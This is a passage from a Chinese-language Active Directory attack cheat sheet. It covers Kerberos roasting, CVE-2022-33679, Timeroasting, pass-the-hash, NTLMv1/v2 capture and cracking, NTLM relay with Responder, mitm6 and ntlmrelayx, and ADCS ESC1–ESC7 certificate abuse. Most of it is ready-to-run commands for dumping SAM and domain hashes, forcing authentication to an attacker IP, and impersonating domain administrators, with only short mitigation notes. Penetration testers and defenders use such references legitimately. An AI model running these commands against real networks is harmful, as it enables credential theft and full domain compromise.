  GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
  ```

* [GhostPack/Rubeus 来自PR #139](https://github.com/GhostPack/Rubeus/pull/139)

  ```powershell
  Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
  ```

## CVE-2022-33679

> CVE-2022-33679通过强制KDC使用RC4-MD4算法，然后使用已知明文攻击从AS-REP中暴力破解会话密钥，执行加密降级攻击。与AS-REP Roasting类似，它针对的是禁用了预认证属性的账户，并且攻击是无认证的，这意味着我们不需要客户端的密码。

来自Project Zero的研究：https://googleprojectzero.blogspot.com/2022/10/rc4-is-still-considered-harmful.html

**要求**：

- 具有属性**DONT_REQ_PREAUTH**的账户（`PowerView > Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose`）

* 使用[CVE-2022-33679.py](https://github.com/Bdenneu/CVE-2022-33679)

  ```bash
  user@hostname:~$ python CVE-2022-33679.py DOMAIN.LOCAL/User DC01.DOMAIN.LOCAL
  user@hostname:~$ export KRB5CCNAME=/home/project/User.ccache
  user@hostname:~$ crackmapexec smb DC01.DOMAIN.LOCAL -k --shares
  ```

**缓解措施**：

* 所有账户必须启用“Kerberos预认证”（默认启用）。
* 如果可能，禁用RC4密码。

## Timeroasting

> Timeroasting利用Windows的NTP认证机制，允许未经认证的攻击者通过发送带有该账户RID的NTP请求，有效地请求任何计算机账户的密码哈希。

* [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Tom Tervoort的Timeroasting脚本

  ```ps1
  sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
  hashcat -m 31300 ntp-hashes.txt
  ```

## 传递哈希

您可以在传递哈希攻击中使用的哈希类型是NT或NTLM哈希。自Windows Vista以来，攻击者无法将哈希传递给非内置RID 500的本地管理员账户。

* Metasploit

  ```powershell
  use exploit/windows/smb/psexec
  set RHOST 10.2.0.3
  set SMBUser jarrieta
  set SMBPass nastyCutt3r  
  # 注释1：密码可以被哈希替换以执行`传递哈希`攻击。
  # 注释2：需要完整的NT哈希，您可能需要添加“空白”的LM（aad3b435b51404eeaad3b435b51404ee）
  set PAYLOAD windows/meterpreter/bind_tcp
  run
  shell
  ```

* CrackMapExec

  ```powershell
  cme smb 10.2.0.2/24 -u jarrieta -H 'aad3b435b51404eeaad3b435b51404ee:489a04c09a5debbc9b975356693e179d' -x "whoami"
  ```

* Impacket套件

  ```powershell
  proxychains python ./psexec.py jarrieta@10.2.0.2 -hashes :489a04c09a5debbc9b975356693e179d
  ```

* Windows RDP和mimikatz

  ```powershell
  sekurlsa::pth /user:Administrator /domain:contoso.local /ntlm:b73fdfe10e87b4ca5c0d957f81de6863
  sekurlsa::pth /user:<用户名> /domain:<域名> /ntlm:<用户的ntlm哈希> /run:"mstsc.exe /restrictedadmin"
  ```

您可以提取本地**SAM数据库**以找到本地管理员哈希：

```powershell
C:\> reg.exe save hklm\sam c:\temp\sam.save
C:\> reg.exe save hklm\security c:\temp\security.save
C:\> reg.exe save hklm\system c:\temp\system.save
$ secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

## OverPass-the-Hash（传递密钥）

在这种技术中，我们不是直接传递哈希，而是使用账户的NT哈希来请求有效的Kerberos票据（TGT）。

### 使用impacket

```bash
root@kali:~$ python ./getTGT.py -hashes ":1a59bd44fe5bec39c44c8cd3524dee" lab.ropnop.com
root@kali:~$ export KRB5CCNAME="/root/impacket-examples/velociraptor.ccache"
root@kali:~$ python3 psexec.py "jurassic.park/velociraptor@labwws02.jurassic.park" -k -no-pass

# 如果你有AES密钥，也可以这样使用
root@kali:~$ ./getTGT.py -aesKey xxxxxxxxxxxxxxkeyaesxxxxxxxxxxxxxxxx lab.ropnop.com

root@kali:~$ ktutil -k ~/mykeys add -p tgwynn@LAB.ROPNOP.COM -e arcfour-hma-md5 -w 1a59bd44fe5bec39c44c8cd3524dee --hex -V 5
root@kali:~$ kinit -t ~/mykers tgwynn@LAB.ROPNOP.COM
root@kali:~$ klist
```

### 使用Rubeus

```powershell
# 以目标用户身份请求TGT并将其传递到当前会话
# 注意：确保清除当前会话中的票证（使用'klist purge'），以确保你没有多个活动的TGT
.\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /ptt

# 更隐蔽的变体，但需要AES256哈希
.\Rubeus.exe asktgt /user:Administrator /aes256:[AES256HASH] /opsec /ptt

# 将票证传递给一个牺牲的隐藏进程，允许你例如从这个进程中窃取令牌（需要提升权限）
.\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /createnetonly:C:\Windows\System32\cmd.exe
```

## 捕获和破解Net-NTLMv1/NTLMv1哈希/令牌

> Net-NTLMv1（NTLMv1）认证令牌用于网络认证（它们是基于用户NT哈希的对称密钥的挑战/响应DES算法派生出来的）。

:information_source: : 使用PetitPotam或SpoolSample在受影响机器上强制回调，并将认证降级为**NetNTLMv1挑战/响应认证**。这使用过时的加密方法DES来保护NT/LM哈希。

**要求**：

* LmCompatibilityLevel = 0x1：发送LM和NTLM（`reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v lmcompatibilitylevel`）

**利用**：

* 使用Responder捕获：编辑`/etc/responder/Responder.conf`文件以包含魔法**1122334455667788**挑战

  ```ps1
  HTTPS = On
  DNS = On
  LDAP = On
  ...
  ; 自定义挑战。
  ; 使用"Random"为每个请求生成随机挑战（默认）
  Challenge = 1122334455667788
  ```

* 启动Responder：`responder -I eth0 --lm`，如果设置了`--disable-ess`，将为NTLMv1认证禁用扩展会话安全

* 强制回调：

  ```ps1
  PetitPotam.exe Responder-IP DC-IP # 于2021年8月左右打补丁
  PetitPotam.py -u Username -p Password -d Domain -dc-ip DC-IP Responder-IP DC-IP # 未针对认证用户打补丁
  ```

* 如果你得到了一些`NetNTLMv1令牌`，你可以尝试通过[Shuck.Sh](https://shuck.sh/)在线**剥离**它们，或者在本地/内部通过[ShuckNT](https://github.com/yanncam/ShuckNT/)来获取与[HIBP数据库](https://haveibeenpwned.com/Passwords)相对应的NT哈希。如果NT哈希之前已经泄露，NetNTLMv1会立即转换为NT哈希（[pass-the-hash](#pass-the-hash)就绪）。[剥离过程](https://www.youtube.com/watch?v=OQD3qDYMyYQ&ab_channel=PasswordVillage)适用于任何NetNTLMv1，无论是否有ESS/SSP（挑战 != `1122334455667788`），但主要针对用户账户（明文预先泄露）。

  

```ps1
# 在线提交NetNTLMv1到 https://shuck.sh/get-shucking.php
# 或者通过ShuckNT脚本在本地剥离它们：
$ php shucknt.php -f tokens-samples.txt -w pwned-passwords-ntlm-reversed-ordered-by-hash-v8.bin
[...]
10 hashes-challenges analyzed in 3 seconds, with 8 NT-Hash instantly broken for pass-the-hash and 1 that can be broken via crack.sh for free.
[INPUT] ycam::ad:DEADC0DEDEADC0DE00000000000000000000000000000000:70C249F75FB6D2C0AC2C2D3808386CCAB1514A2095C582ED:1122334455667788
[NTHASH-SHUCKED] 93B3C62269D55DB9CA660BBB91E2BD0B
```

* 如果你得到了一些`NetNTLMv1令牌`，你也可以尝试通过[Crack.Sh](https://crack.sh/)破解它们（云服务可用时，可能需要更多时间并且可能收费）。为此，你需要将它们格式化以提交到[Crack.Sh](https://crack.sh/netntlm/)。可以使用[Shuck.Sh](https://shuck.sh/)的转换器轻松转换格式。

  ```ps1
  # 当没有ESS/SSP且挑战设置为1122334455667788时，它是免费的（0$）：
  用户名::主机名:响应:响应:挑战 -> NTHASH:响应
  NTHASH:F35A3FE17DCB31F9BE8A8004B3F310C150AFA36195554972
  
  # 当存在ESS/SSP或挑战!= 1122334455667788时，收费从$20-$200不等：
  用户名::主机名:lmresponse+0填充:ntresponse:挑战 -> $NETNTLM$挑战$ntresponse
  $NETNTLM$DEADC0DEDEADC0DE$507E2A2131F4AF4A299D8845DE296F122CA076D49A80476E
  ```

* 最后，如果没有[Shuck.Sh](https://shuck.sh/)和[Crack.Sh](https://crack.sh/)可以使用，你可以尝试使用Hashcat / John The Ripper破解NetNTLMv1。

  ```ps1
  john --format=netntlm hash.txt
  hashcat -m 5500 -a 3 hash.txt # 用于将NetNTLMv1(-ESS/SSP)转换为纯文本（针对用户账户）
  hashcat -m 27000 -a 0 hash.txt nthash-wordlist.txt # 用于将NetNTLMv1(-ESS/SSP)转换为NT哈希（针对用户和计算机账户，具体取决于nthash-wordlist的质量）
  hashcat -m 14000 -a 3 inputs.txt --hex-charset -1 /usr/share/hashcat/charsets/DES_full.hcchr ?1?1?1?1?1?1?1?1 # 用于将NetNTLMv1(-ESS/SSP)转换为DES密钥（KPA攻击），用户/计算机账户成功率为100%，然后在https://shuck.sh/converter.php上使用这些DES密钥重新生成NT哈希。
  ```

* 现在你可以使用Pass-The-Hash和DC机器账户进行DCSync。

:警告: 带有ESS / SSP（扩展会话安全/安全支持提供者）的NetNTLMv1通过添加新的随机数（!= `1122334455667788`，因此在[Crack.Sh](https://crack.sh/)上是收费的）来改变最终的挑战。

:警告: NetNTLMv1格式为`登录::域:lmresp:ntresp:clientChall`。如果`lmresp`包含**0's填充**，这意味着令牌受到**ESS/SSP**的保护。

:警告: 如果没有ESS/SSP，NetNTLMv1的最终挑战就是响应者自己的挑战（`1122334455667788`）。如果启用了ESS/SSP，最终挑战是客户端挑战和服务器挑战连接后MD5哈希的前8个字节。NetNTLMv1的算法生成的详细信息在[Shuck.Sh Generator](https://shuck.sh/generator.php)上进行了说明，并在[MISCMag#128](https://connect.ed-diamond.com/misc/misc-128/shuck-hash-before-trying-to-crack-it)中详细描述。

:警告: 如果你从其他工具（[hostapd-wpe](https://github.com/OpenSecurityResearch/hostapd-wpe)或[chapcrack](https://github.com/moxie0/chapcrack)）获取了其他格式的令牌，如以`$MSCHAPv2$`、`$NETNTLM$`或`$99$`为前缀的令牌，它们对应于经典的NetNTLMv1，可以在[这里](https://shuck.sh/converter.php)从一种格式转换为另一种格式。

**缓解措施**：

* 将Lan Manager认证级别设置为`仅发送NTLMv2响应。拒绝LM和NTLM`

## 捕获和破解Net-NTLMv2/NTLMv2哈希

如果网络中的任何用户尝试访问一台机器并输入错误的IP或名称，Responder将代替它回答并请求NTLMv2哈希以访问资源。Responder将在网络上毒害`LLMNR`、`MDNS`和`NETBIOS`请求。

```powershell
# https://github.com/lgandx/Responder
$ sudo ./Responder.py -I eth0 -wfrd -P -v

# https://github.com/Kevin-Robertson/InveighZero
PS > .\inveighzero.exe -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -MachineAccounts Y -DHCPv6 Y -LLMNRv6 Y [-Elevated N]

# https://github.com/EmpireProject/Empire/blob/master/data/module_source/collection/Invoke-Inveigh.ps1
PS > Invoke-Inveigh [-IP '10.10.10.10'] -ConsoleOutput Y -FileOutput Y -NBNS Y –mDNS Y –Proxy Y -MachineAccounts Y
```

使用Hashcat / John The Ripper破解哈希

```ps1
john --format=netntlmv2 hash.txt
hashcat -m 5600 -a 3 hash.txt
```

## 中间人攻击和转发

NTLMv1和NTLMv2可以被转发以连接到另一台机器。

| 哈希              | Hashcat | 攻击方法      |
| ----------------- | ------- | ------------- |
| LM                | `3000`  | 破解/传递哈希 |
| NTLM/NTHash       | `1000`  | 破解/传递哈希 |
| NTLMv1/Net-NTLMv1 | `5500`  | 破解/中继攻击 |
| NTLMv2/Net-NTLMv2 | `5600`  | 破解/中继攻击 |

使用`hashcat`破解哈希。

```powershell
hashcat -m 5600 -a 0 hash.txt crackstation.txt
```

### MS08-068 NTLM反射

SMB协议中的NTLM反射漏洞仅针对Windows 2000到Windows Server 2008。

> 该漏洞允许攻击者将来袭的SMB连接重定向回其来源的机器，然后使用受害者的凭据访问受害机器。

* https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS08-068

```powershell
msf > use exploit/windows/smb/smb_relay
msf exploit(smb_relay) > show targets
```

### 不需要LDAP签名且禁用了LDAP通道绑定

在进行安全评估时，有时我们没有账户来进行审计。因此，我们可以通过执行NTLM中继攻击将自己注入Active Directory。这种技术需要三个条件：

* 不需要LDAP签名（默认设置为`不需要`）
* 禁用了LDAP通道绑定。（默认禁用）
* 对于被中继的账户，`ms-DS-MachineAccountQuota`至少需要为1（默认为10）

然后我们可以使用诸如`Responder`之类的工具在网络上毒害`LLMNR`、`MDNS`和`NETBIOS`请求，并使用`ntlmrelayx`添加我们的计算机。

```bash
# On first terminal
sudo ./Responder.py -I eth0 -wfrd -P -v

# On second terminal
sudo python ./ntlmrelayx.py -t ldaps://IP_DC --add-computer
```
根据要求，需要通过TLS中继到LDAP，因为在未加密的连接上不允许创建账户。

### SMB签名禁用和IPv4

如果一台机器的`SMB签名`设置为`禁用`，可以使用Responder配合Multirelay.py脚本来执行`NTLMv2哈希中继`并获得该机器的shell访问权限。这也称为**LLMNR/NBNS投毒**

1. 打开Responder.conf文件，将`SMB`和`HTTP`的值设置为`关闭`。

   ```powershell
   [Responder Core]
   ; 要启动的服务器
   ...
   SMB = Off     # 将此项关闭
   HTTP = Off    # 将此项关闭
   ```

2. 运行`python RunFinger.py -i IP_Range`来检测`SMB签名`设置为`禁用`的机器。

3. 运行`python Responder.py -I <interface_card>` 

4. 使用中继工具如`ntlmrelayx`或`MultiRelay`

   - `impacket-ntlmrelayx -tf targets.txt`转储列表中目标的SAM数据库。
   - `python MultiRelay.py -t <target_machine_IP> -u ALL`

5. ntlmrelayx还可以充当每个受损会话的SOCK代理。

   ```powershell
   $ impacket-ntlmrelayx -tf /tmp/targets.txt -socks -smb2support
   [*] 服务器已启动，等待连接
   输入help查看命令列表
   ntlmrelayx> socks
   协议    目标          用户名                  端口
   --------  --------------  ------------------------  ----
   MSSQL     192.168.48.230  VULNERABLE/ADMINISTRATOR  1433
   SMB       192.168.48.230  CONTOSO/NORMALUSER1       445
   MSSQL     192.168.48.230  CONTOSO/NORMALUSER1       1433
   
   # 您可能需要使用“-t”选择一个目标
   # smb://, mssql://, http://, https://, imap://, imaps://, ldap://, ldaps:// 和 smtp://
   impacket-ntlmrelayx -t mssql://10.10.10.10 -socks -smb2support
   impacket-ntlmrelayx -t smb://10.10.10.10 -socks -smb2support
   
   # 然后可以在Impacket工具或CrackMapExec中使用socks代理
   $ proxychains impacket-smbclient //192.168.48.230/Users -U contoso/normaluser1
   $ proxychains impacket-mssqlclient DOMAIN/USER@10.10.10.10 -windows-auth
   $ proxychains crackmapexec mssql 10.10.10.10 -u user -p '' -d DOMAIN -q "SELECT 1"   
   ```

**缓解措施**：

 * 通过组策略禁用LLMNR

   ```powershell
   打开gpedit.msc并导航至计算机配置 > 管理模板 > 网络 > DNS客户端 > 关闭多播名称解析并设置为启用
   ```

 * 禁用NBT-NS

   ```powershell
   这可以通过GUI导航至网卡 > 属性 > IPv4 > 高级 > WINS，然后在“NetBIOS设置”下选择禁用NetBIOS over TCP/IP来实现
   ```

### SMB签名禁用和IPv6

自从[MS16-077](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-077)以来，WPAD文件的位置不再通过广播协议请求，而只通过DNS请求。

```powershell
crackmapexec smb $hosts --gen-relay-list relay.txt

# 通过IPv6进行DNS接管，mitm6将通过DHCPv6请求IPv6地址
# -d 是我们过滤请求的域名 - 被攻击的域名
# -i 是我们让mitm6监听事件的接口
mitm6 -i eth0 -d $domain

# 伪造WPAD并中继NTLM凭据
impacket-ntlmrelayx -6 -wh $attacker_ip -of loot -tf relay.txt
impacket-ntlmrelayx -6 -wh $attacker_ip -l /tmp -socks -debug

# -ip 是您希望中继运行的接口
# -wh 是用于WPAD主机，指定您要服务的wpad文件
# -t 是您希望中继到的目标。 
impacket-ntlmrelayx -ip 10.10.10.1 -wh $attacker_ip -t ldaps://10.10.10.2
```

### 删除MIC

> CVE-2019-1040漏洞使得修改NTLM认证数据包而不使认证失效成为可能，从而使攻击者能够移除防止从SMB中继到LDAP的标志

使用[cve-2019-1040-scanner](https://github.com/fox-it/cve-2019-1040-scanner)检查漏洞

```powershell
python2 scanMIC.py 'DOMAIN/USERNAME:PASSWORD@TARGET'
[*] CVE-2019-1040扫描器由_dirkjan / Fox-IT提供 - 基于SecureAuth的impacket
[*] 目标TARGET对CVE-2019-1040不敏感（认证被拒绝）
```

- 使用任意AD账户，通过SMB连接到受害者Exchange服务器，并触发SpoolService漏洞。攻击者服务器将通过SMB连接回你，这可以通过修改版的ntlmrelayx中继到LDAP。利用中继的LDAP认证，授予攻击者账户DCSync权限。现在攻击者账户可以使用DCSync转储AD中的所有密码哈希

  ```powershell
  TERM1> python printerbug.py testsegment.local/username@s2012exc.testsegment.local <attacker ip/hostname>
  TERM2> ntlmrelayx.py --remove-mic --escalate-user ntu -t ldap://s2016dc.testsegment.local -smb2support
  TERM1> secretsdump.py testsegment/ntu@s2016dc.testsegment.local -just-dc
  ```

- 使用任意AD账户，通过SMB连接到受害者服务器，并触发SpoolService漏洞。攻击者服务器将通过SMB连接回你，这可以通过修改版的ntlmrelayx中继到LDAP。利用中继的LDAP认证，为受害者服务器授予攻击者控制下的计算机账户基于资源的约束委派权限。现在攻击者可以作为受害者服务器上的任何用户进行身份验证。

  ```powershell
  # 创建新的机器账户
  TERM1> ntlmrelayx.py -t ldaps://rlt-dc.relaytest.local --remove-mic --delegate-access -smb2support 
  TERM2> python printerbug.py relaytest.local/username@second-dc-server 10.0.2.6
  TERM1> getST.py -spn host/second-dc-server.local 'relaytest.local/MACHINE$:PASSWORD' -impersonate DOMAIN_ADMIN_USER_NAME
  
  # 使用票据连接
  export KRB5CCNAME=DOMAIN_ADMIN_USER_NAME.ccache
  secretsdump.py -k -no-pass second-dc-server.local -just-dc
  ```

### Ghost Potato - CVE-2019-1384

要求：

* 用户必须是本地管理员组的成员
* 用户必须是备份操作员组的成员
* 令牌必须提升

使用修改版的ntlmrelayx：https://shenaniganslabs.io/files/impacket-ghostpotato.zip

```powershell
ntlmrelayx -smb2support --no-smb-server --gpotato-startup rat.exe
```

### 远程土豆0 DCOM DCE RPC中继

> 它滥用DCOM激活服务并触发目标机器上当前登录用户的NTLM身份验证。

要求：

- 在会话0中的shell（例如WinRm shell或SSH shell）
- 在会话1中登录了特权用户（例如域管理员用户）

```powershell
# https://github.com/antonioCoco/RemotePotato0/
终端> sudo socat TCP-LISTEN:135,fork,reuseaddr TCP:192.168.83.131:9998 & # 对于Windows Server <= 2016可以省略
终端> sudo ntlmrelayx.py -t ldap://192.168.83.135 --no-wcf-server --escalate-user winrm_user_1
会话0> RemotePotato0.exe -r 192.168.83.130 -p 9998 -s 2
终端> psexec.py 'LAB/winrm_user_1:Password123!@192.168.83.135'
```

### 使用mitm6进行DNS投毒 - 中继委托

要求：

- 启用了IPv6（Windows优先选择IPv6而不是IPv4）
- LDAP over TLS（LDAPS）

> ntlmrelayx将捕获的凭据转发到域控制器上的LDAP，使用该凭据创建新的机器帐户，打印帐户的名称和密码并修改其委托权限。

```powershell
git clone https://github.com/fox-it/mitm6.git 
cd /opt/tools/mitm6
pip install .

mitm6 -hw ws02 -d lab.local --ignore-nofqnd
# -d: 我们过滤请求的域名（被攻击的域名）
# -i: mitm6监听事件的接口
# -hw: 主机白名单

ntlmrelayx.py -ip 10.10.10.10 -t ldaps://dc01.lab.local -wh attacker-wpad
ntlmrelayx.py -ip 10.10.10.10 -t ldaps://dc01.lab.local -wh attacker-wpad --add-computer
# -ip: 您希望中继运行的接口
# -wh: WPAD主机，指定您要提供的wpad文件
# -t: 您想要转发到的目标

# 现在授予委托权限，然后执行RBCD
ntlmrelayx.py -t ldaps://dc01.lab.local --delegate-access --no-smb-server -wh attacker-wpad
getST.py -spn cifs/target.lab.local lab.local/GENERATED\$ -impersonate Administrator  
export KRB5CCNAME=administrator.ccache  
secretsdump.py -k -no-pass target.lab.local  
```

### 使用WebDav技巧进行中继

> 一个利用示例，您可以强制机器帐户向主机进行身份验证，并将其与基于资源的约束委派结合使用，以获得更高的访问权限。它允许攻击者通过HTTP而不是SMB引出认证。

**要求**：

* WebClient服务

**利用**：

* 在Responder中禁用HTTP：`sudo vi /usr/share/responder/Responder.conf`

* 生成Windows机器名称：`sudo responder -I eth0`，例如：WIN-UBNW4FI3AP0

* 准备针对DC的RBCD：`python3 ntlmrelayx.py -t ldaps://dc --delegate-access -smb2support`

* 发现WebDAV服务

  ```ps1
  webclientservicescanner 'domain.local'/'user':'password'@'machine'
  crackmapexec smb 'TARGETS' -d 'domain' -u 'user' -p 'password' -M webdav
  GetWebDAVStatus.exe 'machine'
  ```

* 触发认证以中继到我们的nltmrelayx：`PetitPotam.exe WIN-UBNW4FI3AP0@80/test.txt 10.0.0.4`，必须使用FQDN或完整的NetBIOS名称指定监听器主机，如`logger.domain.local@80/test.txt`。指定IP会导致匿名认证而不是System。 

  ```ps1
  # PrinterBug
  dementor.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "ATTACKER_IP"
  SpoolSample.exe "ATTACKER_IP" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt"
  
  # PetitPotam
  Petitpotam.py "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "ATTACKER_IP"
  Petitpotam.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "ATTACKER_IP"
  PetitPotam.exe "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "ATTACKER_IP"
  ```

* 使用创建的帐户请求服务票证： 

  ```ps1
  .\Rubeus.exe hash /domain:purple.lab /user:WVLFLLKZ$ /password:'iUAL)l<i$;UzD7W'
  .\Rubeus.exe s4u /user:WVLFLLKZ$ /aes256:E0B3D87B512C218D38FAFDBD8A2EC55C83044FD24B6D740140C329F248992D8F /impersonateuser:Administrator /msdsspn:host/pc1.purple.lab /altservice:cifs /nowrap /ptt
  ls \\PC1.purple.lab\c$
  # PC1的IP：10.0.0.4
  ```

### 使用pyrdp-mitm进行中间人RDP连接

* https://github.com/GoSecure/pyrdp
* https://www.gosecure.net/blog/2018/12/19/rdp-man-in-the-middle-smile-youre-on-camera/
* 使用

```sh
pyrdp-mitm.py <IP>
pyrdp-mitp.py <IP>:<PORT> # 使用自定义端口
pyrdp-mitm.py <IP> -k private_key.pem -c certificate.pem # 使用自定义密钥和证书
```

* 利用
  * 如果启用了网络级别身份验证（NLA），您将获取客户端的NetNTLMv2挑战
  * 如果禁用了NLA，您将以纯文本形式获取密码
  * 其他功能如键盘记录可用
* 替代方案
  * S3th：https://github.com/SySS-Research/Seth，在启动RDP监听器之前执行ARP欺骗	

## AD域证书服务

* 查找ADCS服务器
  * `crackmapexec ldap domain.lab -u 用户名 -p 密码 -M adcs`
  * `ldapsearch -H ldap://dc_IP -x -LLL -D 'CN=<用户>,OU=Users,DC=domain,DC=local' -w '<密码>' -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=CONFIGURATION,DC=domain,DC=local" dNSHostName`
* 使用certutil枚举AD企业CA：`certutil.exe -config - -ping`，`certutil -dump`

### ESC1 - 配置错误的证书模板

> 域用户可以注册**VulnTemplate**模板，该模板可用于客户端身份验证，并设置了**ENROLLEE_SUPPLIES_SUBJECT**。这允许任何人注册此模板并指定任意主题备用名称（例如作为DA）。允许在主题之外将其他身份绑定到证书。

**要求**

* 允许AD身份验证的模板
* **ENROLLEE_SUPPLIES_SUBJECT**标志
* [PKINIT]客户端身份验证、智能卡登录、任何目的或无EKU（扩展/增强密钥用途）

**利用**

* 使用[Certify.exe](https://github.com/GhostPack/Certify)查看是否有任何易受攻击的模板

  ```ps1
  Certify.exe find /vulnerable
  Certify.exe find /vulnerable /currentuser
  # 或
  PS> Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2) (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))' -SearchBase 'CN=Configuration,DC=lab,DC=local'
  # 或
  certipy 'domain.local'/'user':'password'@'domaincontroller' find -bloodhound
  ```

* 使用Certify、[Certi](https://github.com/eloypgz/certi)或[Certipy](https://github.com/ly4k/Certipy)请求证书并添加备用名称（要模拟的用户）

  ```ps1
  # 通过从提升的命令提示符执行Certify并使用"/machine"参数为计算机帐户请求证书。
  Certify.exe request /ca:dc.domain.local\domain-DC-CA /template:VulnTemplate /altname:domadmin
  certi.py req 'contoso.local/Anakin@dc01.contoso.local' contoso-DC01-CA -k -n --alt-name han --template UserSAN
  certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC1' -alt 'administrator@corp.local'
  ```

* 使用OpenSSL转换证书，不要输入密码

  ```ps1
  openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
  ```

* 将cert.pfx移动到目标机器文件系统，并使用Rubeus为altname用户请求TGT

  ```ps1
  Rubeus.exe asktgt /user:domadmin /certificate:C:\Temp\cert.pfx
  ```

**警告**：即使用户或计算机重置了密码，这些证书仍然可用！

**注意**：寻找**EDITF_ATTRIBUTESUBJECTALTNAME2**、**CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT**、**ManageCA**标志以及NTLM中继到AD CS HTTP端点。

### ESC2 - 配置错误的证书模板

**要求**

* 允许请求者在CSR中指定主题备用名称（SAN），以及允许任何目的EKU（2.5.29.37.0）

**利用**

* 查找模板

  ```ps1
  PS > Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))' -SearchBase 'CN=Configuration,DC=megacorp,DC=local'
  ```

* 如[ESC1](#esc1---配置错误的证书模板)中所述，请求一个指定`/altname`为域管理员的证书。

### ESC3 - 配置错误的注册代理模板

> ESC3是指证书模板指定了证书请求代理EKU（注册代理）。此EKU可用于代表其他用户请求证书。

* 基于易受攻击的证书模板ESC3请求证书。

  ```ps1
  $ certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC3'
  [*] 已将证书和私钥保存到 'john.pfx'
  ```

* 使用证书请求代理证书(-pfx)代表另一个用户请求证书

  ```ps1
  $ certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'
  ```

### ESC4 - 访问控制漏洞

> 为允许域身份验证的模板启用`mspki-certificate-name-flag`标志，允许攻击者“推送配置错误到模板，导致ESC1漏洞”。

* 使用[modifyCertTemplate](https://github.com/fortalice/modifyCertTemplate)搜索值为`00000000-0000-0000-0000-000000000000`的`WriteProperty`

  ```ps1
  python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -get-acl
  ```

* 添加`ENROLLEE_SUPPLIES_SUBJECT`（ESS）标志以执行ESC1

  ```ps1
  python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -add enrollee_supplies_subject -property mspki-Certificate-Name-Flag
  
  # 从WebServer模板中添加/删除ENROLLEE_SUPPLIES_SUBJECT标志。 
  C:\>StandIn.exe --adcs --filter WebServer --ess --add
  ```

* 执行ESC1后恢复值

  ```ps1
  python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -value 0 -property mspki-Certificate-Name-Flag
  ```

使用Certipy

```ps1
# 覆盖配置以使其容易受到ESC1的攻击
certipy template 'corp.local/johnpc$@ca.corp.local' -hashes :fc525c9683e8fe067095ba2ddc971889 -template 'ESC4' -save-old
# 基于ESC4模板请求证书，就像ESC1一样。
certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC4' -alt 'administrator@corp.local'
# 恢复旧配置
certipy template 'corp.local/johnpc$@ca.corp.local' -hashes :fc525c9683e8fe067095ba2ddc971889 -template 'ESC4' -configuration ESC4.json
```

### ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2

> 如果此标志在CA上设置，则任何请求（包括从Active Directory构建的主题）都可以在主题备用名称中有用户定义的值。

**利用**

* 使用[Certify.exe](https://github.com/GhostPack/Certify)检查**UserSpecifiedSAN**标志状态，该标志指的是`EDITF_ATTRIBUTESUBJECTALTNAME2`标志。

  ```ps1
  Certify.exe cas
  ```

* 为模板请求证书并添加altname，即使默认的`User`模板通常不允许指定备用名称

  ```ps1
  .\Certify.exe request /ca:dc.domain.local\domain-DC-CA /template:User /altname:DomAdmin
  ```

**缓解措施**

* 移除标志：`certutil.exe -config "CA01.domain.local\CA01" -setreg "policy\EditFlags" -EDITF_ATTRIBUTESUBJECTALTNAME2`

### ESC7 - 易受攻击的证书颁发机构访问控制

**利用**

* 检测允许低权限用户拥有`ManageCA`或`Manage Certificates`权限的CA

  ```ps1
  Certify.exe find /vulnerable
  ```

* 更改CA设置，为易受攻击的CA下的所有模板启用SAN扩展（ESC6）

  ```ps1
  Certify.exe setconfig /enablesan /restart
  ```

* 请求具有所需SAN的证书。

  ```ps1
  Certify.exe request /template:User /altname:super.adm
  ```

* 如有必要授予批准或禁用批准要求

  ```ps1
  # 授予
  Certify.exe issue /id:[REQUEST ID]
  # 禁用
  Certify.exe setconfig /removeapproval /restart
  ```

从**ManageCA**到ADCS服务器上的**RCE**的替代利用方法：

```ps1
# 获取当前的CDP列表。有助于找到远程可写共享：
